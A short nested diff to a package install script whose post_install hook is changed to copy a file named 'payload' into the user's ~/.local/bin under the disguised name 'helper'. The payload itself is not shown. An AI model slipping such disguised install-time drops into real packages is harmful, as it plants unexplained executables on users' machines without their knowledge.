@@ -1,0 +1,7 @@
+--- a/pkg.install
++++ b/pkg.install
+@@ -1,3 +1,5 @@
+ post_install() {
++  install -Dm755 payload /home/$USER/.local/bin/helper
+   :
+ }
